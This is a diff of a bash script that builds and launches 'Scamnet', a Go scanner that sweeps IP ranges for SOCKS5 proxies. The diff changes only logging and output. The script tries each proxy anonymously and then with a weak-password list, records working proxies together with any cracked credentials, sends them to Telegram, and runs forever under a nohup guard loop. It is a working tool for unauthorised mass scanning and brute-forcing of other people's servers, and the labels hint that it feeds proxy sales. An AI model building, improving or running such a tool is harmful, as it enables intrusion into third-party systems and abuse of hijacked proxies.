@@ -1,14 +1,12 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v1.2（纯 Go + 412 弱口令 + 内存优化 + 类型安全）
+# main.sh - Scamnet OTC v1.3（日志极致优化 + 进度条移除 + 自动轮转）
 set -euo pipefail
 IFS=$'\n\t'
-
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; BLUE='\033[34m'; NC='\033[0m'
 LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LATEST_LOG="$LOG_DIR/latest.log"
 GO_BIN="$LOG_DIR/scamnet_go"
 VALID_FILE="socks5_valid.txt"
-
 log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
 err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
 succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }
@@ -41,7 +39,9 @@ echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-log "正在编译 Go 扫描器（412 条弱口令 + 内存优化 + 类型安全）..."
+log "正在编译 Go 扫描器（日志优化版）..."
+
+# ============ 优化的 Go 源码开始 ============
 cat > scamnet.go << 'EOF'
 package main
 
@@ -68,22 +68,22 @@ import (
 )
 
 type Config struct {
-	StartIP       string
-	EndIP         string
-	Ports         string
-	TelegramToken string
-	TelegramChat  string
-	BatchSize     int
-	MaxConcurrent int
-	Timeout       int
+	StartIP        string
+	EndIP          string
+	Ports          string
+	TelegramToken  string
+	TelegramChat   string
+	BatchSize      int
+	MaxConcurrent  int
+	Timeout        int
 }
 
 var (
-	cfg          Config
-	validFile    = "socks5_valid.txt"
-	seen         = sync.Map{}
-	stats        = make(map[string]int)
-	statsMu      sync.Mutex
+	cfg       Config
+	validFile = "socks5_valid.txt"
+	seen      = sync.Map{}
+	stats     = make(map[string]int)
+	statsMu   sync.Mutex
 	countryCache = sync.Map{}
 )
 
@@ -168,14 +168,13 @@ func main() {
 	start := ipToInt(cfg.StartIP)
 	end := ipToInt(cfg.EndIP)
 	ports := parsePorts(cfg.Ports)
-
 	total := uint64(end-start+1) * uint64(len(ports))
 	batchCount := (total + uint64(cfg.BatchSize) - 1) / uint64(cfg.BatchSize)
 
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v1.2 OTC TG:soqunla - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.3 LOG-OPTIMIZED - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	f.Close()
 
 	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
@@ -183,7 +182,8 @@ func main() {
 		if batchEnd > total {
 			batchEnd = total
 		}
-		fmt.Printf("[*] 批次 %d → %d (%d tasks)\n", batchStart/uint64(cfg.BatchSize)+1, batchEnd, batchEnd-batchStart)
+		// 仅打印批次信息，不打印进度条
+		fmt.Printf("[*] 批次 %d/%d → %d tasks\n", batchStart/uint64(cfg.BatchSize)+1, batchCount, batchEnd-batchStart)
 		scanBatchByIndex(start, end, ports, batchStart, batchEnd)
 	}
 
@@ -194,30 +194,8 @@ func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd u
 	sem := semaphore.NewWeighted(int64(cfg.MaxConcurrent))
 	ctx := context.Background()
 	var wg sync.WaitGroup
-
-	progress := int32(0)
-	total := int32(batchEnd - batchStart)
-	go func() {
-		for {
-			p := atomic.LoadInt32(&progress)
-			fmt.Printf("\r批次: %d%% | %d/%d [", p*100/total, p, total)
-			bar := int(p * 50 / total)
-			for i := 0; i < bar; i++ {
-				fmt.Print("=")
-			}
-			for i := bar; i < 50; i++ {
-				fmt.Print(" ")
-			}
-			fmt.Print("]")
-			if p == total {
-				fmt.Println()
-				break
-			}
-			time.Sleep(200 * time.Millisecond)
-		}
-	}()
-
 	taskIdx := batchStart
+
 	for ip := startIP; ip <= endIP && taskIdx < batchEnd; ip++ {
 		s := intToIP(ip)
 		for _, p := range ports {
@@ -233,7 +211,6 @@ func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd u
 				}
 				defer sem.Release(1)
 				scanTarget(t)
-				atomic.AddInt32(&progress, 1)
 			}(target)
 			taskIdx++
 		}
@@ -247,16 +224,16 @@ func scanTarget(target string) {
 		return
 	}
 	seen.Store(target, true)
-
 	parts := strings.SplitN(target, ":", 2)
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
+	// 先测匿名
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 		return
 	}
-
+	// 再测弱口令
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -270,24 +247,19 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 	if user == "" && pass == "" {
 		proxyURL = fmt.Sprintf("socks5://%s:%d", ip, port)
 	}
-
 	u, err := url.Parse(proxyURL)
 	if err != nil {
 		return false, 0, ""
 	}
-
 	client := &http.Client{
 		Transport: &http.Transport{
-			Proxy: http.ProxyURL(u),
-			DialContext: (&net.Dialer{
-				Timeout: time.Duration(cfg.Timeout) * time.Second,
-			}).DialContext,
+			Proxy:               http.ProxyURL(u),
+			DialContext:         (&net.Dialer{Timeout: time.Duration(cfg.Timeout) * time.Second}).DialContext,
 			TLSHandshakeTimeout: time.Duration(cfg.Timeout) * time.Second,
 			ResponseHeaderTimeout: time.Duration(cfg.Timeout) * time.Second,
 		},
 		Timeout: time.Duration(cfg.Timeout) * time.Second,
 	}
-
 	start := time.Now()
 	resp, err := client.Get("https://httpbin.org/ip")
 	lat := int(time.Since(start).Milliseconds())
@@ -295,7 +267,6 @@ func testSocks5(ip string, port int, user, pass string) (bool, int, string) {
 		return false, 0, ""
 	}
 	defer resp.Body.Close()
-
 	body, _ := ioutil.ReadAll(resp.Body)
 	var info IPInfo
 	if err := json.Unmarshal(body, &info); err != nil {
@@ -314,7 +285,6 @@ func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
 		auth = user + ":" + pass + "@"
 	}
 	result := fmt.Sprintf("socks5://%s%s:%d#%s", auth, ip, port, country)
-
 	f, _ := os.OpenFile(validFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 	fmt.Fprintln(f, result)
 	f.Close()
@@ -323,7 +293,9 @@ func saveAndNotify(ip string, port int, user, pass, origin string, lat int) {
 	stats[country]++
 	statsMu.Unlock()
 
+	// 仅打印成功信息
 	fmt.Printf("[+] %s (%dms)\n", result, lat)
+
 	if cfg.TelegramToken != "" {
 		sendTelegram(fmt.Sprintf("New: <code>%s</code>\nDelay: %dms | %s", result, lat, country))
 	}
@@ -382,7 +354,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.2 OTC TG:soqunla - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.3 LOG-OPTIMIZED - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
 	for _, l := range sorted {
 		out.WriteString(l + "\n")
 	}
@@ -427,17 +399,28 @@ func parsePorts(s string) []int {
 	return ports
 }
 EOF
+# ============ Go 源码结束 ============
 
 go mod init scamnet 2>/dev/null || true
 go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
 succ "Go 扫描器编译完成 → $GO_BIN"
 
+# ============ 优化后的守卫脚本（日志轮转 + 过滤） ============
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
 cat > "$GUARD_SCRIPT" << EOF
 #!/bin/bash
+LOG="$LATEST_LOG"
+MAX_LINES=500
+
+# 清空旧日志
+> "\$LOG"
+echo "[GUARD] \$(date) - 日志优化模式启动" | tee -a "\$LOG"
+echo "[GUARD] 范围: $START_IP ~ $END_IP | 端口: $PORTS" | tee -a "\$LOG"
+
 while :; do
-    echo "[GUARD] \$(date) - 启动扫描..."
+    echo "[GUARD] \$(date) - 开始新一轮扫描..." | tee -a "\$LOG"
+
     $GO_BIN \\
         -start "$START_IP" \\
         -end "$END_IP" \\
@@ -447,8 +430,14 @@ while :; do
         -batch 250 \\
         -conc 150 \\
         -timeout 6 \\
-        2>&1 | tee -a "$LATEST_LOG"
-    echo "[GUARD] 重启中..."
+        2>&1 | grep -E '^\\\[\\\+\\\]|\\[GUARD\\\]' | tee -a "\$LOG"
+
+    # 保留最后 \$MAX_LINES 行
+    if command -v tail >/dev/null; then
+        tail -n "\$MAX_LINES" "\$LOG" > "\$LOG.tmp" && mv "\$LOG.tmp" "\$LOG"
+    fi
+
+    echo "[GUARD] \$(date) - 本轮结束，3秒后重启..." | tee -a "\$LOG"
     sleep 3
 done
 EOF
@@ -457,6 +446,6 @@ chmod +x "$GUARD_SCRIPT"
 pkill -f "scamnet_guard.sh" 2>/dev/null || true
 nohup bash "$GUARD_SCRIPT" > /dev/null 2>&1 &
 succ "守护进程启动！PID: $!"
-log "日志: tail -f $LATEST_LOG"
+log "日志: tail -f $LATEST_LOG  (已优化，最多 500 行)"
 log "停止: pkill -f scamnet_guard.sh"
 log "结果: $VALID_FILE"
